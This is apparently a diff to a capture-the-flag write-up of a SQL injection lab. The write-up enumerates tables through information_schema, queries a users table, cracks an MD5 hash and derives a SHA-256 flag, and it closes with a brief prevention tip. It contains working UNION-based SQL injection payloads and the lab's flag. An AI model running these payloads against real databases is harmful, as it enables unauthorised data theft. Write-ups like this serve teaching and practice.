@@ -9,31 +9,7 @@ One of them is GetThe Flag (surname first name);
 so we need to get more information, first we get all tables name and colmums name with :
 
 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns
--> we can see a table named users, with severals columns :
-ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
-First name: users
-Surname : user_id
-ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
-First name: users
-Surname : first_name
-ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
-First name: users
-Surname : last_name
-ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
-First name: users
-Surname : town
-ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
-First name: users
-Surname : country
-ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
-First name: users
-Surname : planet
-ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
-First name: users
-Surname : Commentaire
-ID: 1 or 1=1 UNION select table_name, column_name FROM information_schema.columns 
-First name: users
-Surname : countersign
+-> we can see a table named users, with severals columns : user_id, first_name, last_name, town, country, planet, Commentaire, countersign
 
 First try :
 1 or 1=1 UNION SELECT town, country  FROM users
@@ -57,3 +33,8 @@ md5 ( 5ff9d0165b4f92b14994e5c685cdce28 ) = FortyTwo
 Sh256 ( fortytwo ) = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
 This is our FLag !
+
+
+This can be used to extract data form DB. 
+
+To prevent you can use an Object Relation Mapping ORM like PDO in PHP.
